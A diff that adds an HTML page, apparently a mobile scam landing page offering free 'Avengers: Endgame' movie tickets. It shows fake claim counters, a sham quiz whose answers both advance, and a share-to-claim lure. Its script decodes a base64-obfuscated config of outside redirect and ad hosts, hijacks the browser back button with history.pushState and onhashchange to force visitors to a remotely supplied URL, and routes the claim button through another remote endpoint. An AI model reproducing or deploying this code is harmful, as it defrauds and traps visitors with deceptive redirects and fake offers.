@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset=utf-8>
+    <meta content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport">
+    <meta content="yes" name="apple-mobile-web-app-capable">
+    <meta content="black" name="apple-mobile-web-app-status-bar-style">
+    <meta content="telephone=no" name="format-detection">
+    <meta content="email=no" name="format-detection">
+    <title>《复仇者联盟4》上映在即，电影票任性送！</title>
+    <!--<script type="text/javascript">
+        var lujing = "https://xx3-41.oss-cn-shanghai.aliyuncs.com/xx3-41/dyfrees/";
+    </script>-->
+    <link rel="stylesheet" href="https://unify0402.oss-cn-hangzhou.aliyuncs.com/dianyingpiao/css/index.css">
+    <script type="text/javascript" src="https://unify0402.oss-cn-hangzhou.aliyuncs.com/dianyingpiao/js/adaptive.js"></script>
+</head>
+
+<body>
+<div class="film_content">
+    <img src="https://unify0402.oss-cn-hangzhou.aliyuncs.com/dianyingpiao/img/film_ban1.jpg" class="film_ban">
+    <img src="https://unify0402.oss-cn-hangzhou.aliyuncs.com/dianyingpiao/img/film_hb.png" class="film_hb">
+    <div class="film_title">复仇者联盟4：终局之战</div>
+    <button class="film_btn bigsmall" onclick="getMovies()">点击免费领取电影票</button>
+    <div class="film_num">- 今日已有<span id="getNum">6382</span>人免费领取了电影票 -</div>
+    <div class="newhbget_list" id="scrollPeople">
+        <ul>
+
+        </ul>
+    </div>
+</div>
+
+
+<div class="question">
+    <div class="question_con">
+        <h3 class="question_title">电影的首映日是几月几日？</h3>
+        <div class="question_notice">活动<span class="color_red">限量限时</span>，答对题可领电影票！</div>
+        <div class="question_time">活动倒计时：<span id="questionTime" class="color_red"></span></div>
+        <div class="question_bot">
+            <a onclick="luodi2()">4月23日</a>
+            <a onclick="luodi2()">4月24日</a>
+        </div>
+    </div>
+</div>
+
+<script type="text/javascript" src="https://unify0402.oss-cn-hangzhou.aliyuncs.com/dianyingpiao/js/jquery-1.11.1.min.js"></script>
+<script src="https://unify0402.oss-cn-hangzhou.aliyuncs.com/dianyingpiao/js/index.js"></script>
+<script type="text/javascript">
+    var obj = JSON.parse(window.atob('eyJhZHYiOiJodHRwOlwvXC9nb29kcy5jeGRkbnd4LmNvbVwvaW5kZXhcL2FkdlwvQWludGVyZmFjZXNcL2RpciIsImlzd2VjaGF0IjoxLCJpc2Rvd24iOjEsImVycm9yIjoiaHR0cDpcL1wvd3d3LmNoYWljcC5jb20iLCJiaW1nIjoiaHR0cHM6XC9cL3VuaWZ5MDQwMi5vc3MtY24taGFuZ3pob3UuYWxpeXVuY3MuY29tXC9kaWFueWluZ3BpYW9cL2ltZ1wvc2hhcmU4OTMuanBnIiwiYnRleHQiOiJcdTVkZTUiLCJuIjoyOTksImlkIjoyNywiYXBpYyI6Imh0dHA6XC9cL2pzemh1b2hhbmcuY29tXC9pbmRleC5waHBcL2luZGV4XC9nZXRTaGFyZWNcL2lkXC8iLCJuYW1lIjoiXHU4MjdhXHU2ZTA1In0='));
+    //  console.log(obj);
+
+
+    $.getJSON(obj.adv+'/new531',function (e) {
+        setTimeout(function(){
+            history.pushState(history.length + 1, "message", "#" + new Date().getTime());
+        },200);
+        window.onhashchange = function() {
+            location.href = e.url+'&pk=unify0402_dyp';
+        };
+    });
+
+
+    function getMovies(){
+        $(".question").show();
+    }
+    function luodi2(){
+
+        $(".question").hide();
+
+        $(".film_content").html("<div class=\"film_detail\">\n" +
+            "        <p class=\"film_word\">复仇者联盟4：终局之战</p>\n" +
+            "        <img src=\"https://unify0402.oss-cn-hangzhou.aliyuncs.com/dianyingpiao/img/film_ban.jpg\" class=\"detail_img\">\n" +
+            "        <img src=\"https://unify0402.oss-cn-hangzhou.aliyuncs.com/dianyingpiao/img/film_open.png\" class=\"film_open\">\n" +
+            "    </div>\n" +
+            "    <div class=\"film_title\" style=\"padding-bottom: 0;\">复仇者联盟4：终局之战电影票<p class=\"word\">今日已有<span>6387</span>人免费领取了电影票</p></div>\n" +
+            "    <button class=\"film_btn\" onclick=\"getjump()\">立即领取</button>\n" +
+            "    <div class=\"film_yhj\">\n" +
+            "        <img src=\"https://unify0402.oss-cn-hangzhou.aliyuncs.com/dianyingpiao/img/film_yhj.png\" onclick=\"getjump()\">\n" +
+            "        <img src=\"https://unify0402.oss-cn-hangzhou.aliyuncs.com/dianyingpiao/img/film_yhj.png\" onclick=\"getjump()\">\n" +
+            "    </div>\n" +
+            "    <div class=\"film_title\" style=\"padding-bottom: 20px;\"><p class=\"word\">分享完成即可获得电影票</p></div>");
+
+    }
+
+    function getjump(){
+        $.getJSON(obj.apic+obj.id,function (e) {
+            //  console.log(obj.apic+obj.id+'/num/'+11);
+            location.href = e.v+'/money/'+window.name;
+        });
+    }
+
+
+
+</script>
+
+<script type="text/javascript" src="https://unify0402.oss-cn-hangzhou.aliyuncs.com/dianyingpiao/js/common.js"></script>
+
+<script type="text/javascript">
+
+    var urls = '/xx3-41/dyfrees/';
+    var advertising = '/bak/gg/?ggxx3&feinanke&';
+    function hh() {history.pushState(history.length+1, "message", window.location.href.split('#')[0]+"#"+new Date().getTime());}
+
+
+    setTimeout('hh();', 200);
+
+</script>
+
+
+<div style="display: none">
+    <script type="text/javascript" src="https://s23.cnzz.com/z_stat.php?id=1276877888&web_id=1276877888"></script>
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?7e72c1d9913adaf1e7f67f6c25b7d6e9";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+</div>
+</body>
+</html>
